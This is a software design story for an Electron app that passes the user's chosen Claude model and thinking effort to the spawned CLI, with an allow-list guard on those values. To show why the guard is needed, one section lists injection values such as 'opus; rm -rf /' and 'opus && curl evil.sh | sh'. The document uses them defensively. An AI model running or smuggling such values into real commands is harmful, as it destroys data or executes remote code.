# 109 — The picker's model and effort reach the process

| | |
|---|---|
| **ID** | HIVE-109 |
| **Epic** | — (defect against [044](044-new-session-picker.md), [096](096-session-lifecycle-claude.md)) |
| **Depends on** | [096-session-lifecycle-claude.md](096-session-lifecycle-claude.md), [108-live-session-fixes.md](108-live-session-fixes.md) |
| **Points** | 3 |
| **Location** | `app/electron/shared/{session-contract,ipc-contract,guards}.ts`, `app/electron/main/sessions/{bootstrap,index}.ts`, `app/electron/main/ipc/index.ts`, `app/src/lib/terminal/`, `app/src/stores/hive-store.ts` |

## Story

> As someone starting a session, I want the model and thinking effort I picked
> to be the model and thinking effort the session actually runs with — so that
> the chip on its meta bar is a fact rather than a decoration.

## The defect

The new-session picker has offered a model and a thinking effort since story
044. `spawnSession` records both on the entity, the meta bar renders them, the
orchestrator table sorts around them.

They reached the process in no story at all. `requestSpawn(id, project, task)`
carried a task and nothing else; `SpawnRequest` had no field for either;
`sessionCommand` produced `claude && exit` regardless. A session started as
Haiku with low effort opened as Opus with high — and its own chip said Haiku.

The app was not just failing to apply a setting. It was **asserting one it had
not applied**, which is worse: the fleet view's entire job is to be true about
what is running.

## What the CLI already accepts

Nothing had to be invented. `claude` takes both:

```
--model <model>    alias for the latest model ('fable', 'opus', 'sonnet') or a full name
--effort <level>   low, medium, high, xhigh, max
```

The app's own vocabularies already match, exactly: `Model` is
`haiku | sonnet | opus | fable` and `Effort` is `low | medium | high | max` —
every one of them a word the CLI accepts, spelled the way the CLI spells it. So
there is **no translation table**, which is the single best property of this
change: a mapping would be a second place to be wrong, and it would rot the
first time an alias changed.

`--effort xhigh` exists and the picker does not offer it. Left alone; a value
main would accept but nothing can send costs nothing.

### Wrapper commands

`claudeCommand` is routinely not `claude` — this machine's config points a
project at `clauded`, a shell function that adds
`--dangerously-skip-permissions` and forwards the rest. Appending flags after
the configured command is what makes that work, and a wrapper that ignores
arguments simply ignores them.

A wrapper that *rejects* them exits non-zero, `&&` does not fire, and the login
shell stays up with the complaint on screen — the same failure mode a mistyped
`claudeCommand` already had, and the reason story 096 chose `&&` over `;`.

## Where the closed set lives, and why it is a closed set

`model` and `effort` are now the **only thing the renderer contributes to a
command line the main process assembles and writes into a shell.**

That single sentence decides the design. `assertText` — bounded, printable, no
control characters — would have accepted every one of these:

```
opus; rm -rf /
opus && curl evil.sh | sh
opus $(whoami)
--dangerously-skip-permissions
```

So the guard validates membership of a fixed list (`assertOneOf`), which makes
the value **unquotable rather than quoted**. Quoting is a thing you have to get
right; an enum is a thing that cannot be wrong. `sessionCommand` interpolates
the values bare, and says in a comment that it may only do so *because* of that
guard — so the day someone adds a value with a space in it, the reason the line
breaks is written next to the line.

The lists therefore live in `electron/shared/session-contract.ts`, the one module
both processes read. `src/types/entity.ts` now **aliases** them rather than
declaring its own copy: two independent lists is how a picker comes to offer a
model the guard rejects, which presents to the user as a session that silently
fails to start.

## Absent means say nothing

Every field is optional at every hop, and omitting one omits its flag rather
than substituting a default.

This matters for the sessions nobody picked for — a fixture opened for the first
time, a `spawn` typed into the console before the picker existed. Inventing a
flag for those would silently override a model the user configured in `claude`
itself, which this app has no business touching.

The store is the exception, and deliberately: `spawnSession` resolves
`model ?? 'opus'` and `effort ?? 'high'` *before* recording them on the entity,
and sends the **resolved** values. That is what keeps the chip honest — a
console `spawn` creates a row that says opus/high, so the process had better be
opus/high.

## Two spawn paths, both covered

| Path | Who has the choice | How it travels |
|---|---|---|
| Picker / console `spawn` | the store, eagerly | `spawnSession` → `requestSpawn(id, project, {model, effort})` |
| Opening an existing session | the entity | `resolveTransport` reads it → `createPtyTransport(id, project, opts)` → `ensureSpawned` |

The second is easy to miss and is the more common one after the first launch.
It goes through `resolve-transport.ts` because that is already the store-aware
half of the seam — the module that turns an entity into a project id for exactly
this reason — which keeps `pty-transport.ts` reading no store, as story 094
requires.

## Restart keeps them; the task is still dropped

`restart` deliberately does **not** forward the session's task: the previous
generation may already have acted on it, and re-delivering an instruction after
a user asked for a clean slate is worse than delivering nothing.

Model and effort are forwarded, and the asymmetry is the point. A task is an
instruction. A model is what the session *is* — restarting a Haiku session as
something else is not a restart.

## Verification

The unit tests each see one link. The chain is proved in `tests/e2e/electron/`,
driven through `pty.spawn` rather than the picker UI, against a stub that
records `"$@"`: what needs proving is the IPC guard, main's assembly, and a real
`/bin/sh` agreeing on where the word boundaries are. Only a shell can prove the
last one.

## Not in this story

- **Changing a running session's model.** There is no UI for it and the CLI flag
  is a launch-time argument; `/model` inside the session is the real mechanism.
- **`xhigh` in the picker.** The contract accepts it; the stepper does not offer
  it. A one-line change whenever it is wanted.
- **Per-project default model.** `config.json` already carries per-project
  `claudeCommand` and shell overrides (story 104), and a default model would sit
  naturally beside them. Out of scope for a defect fix.
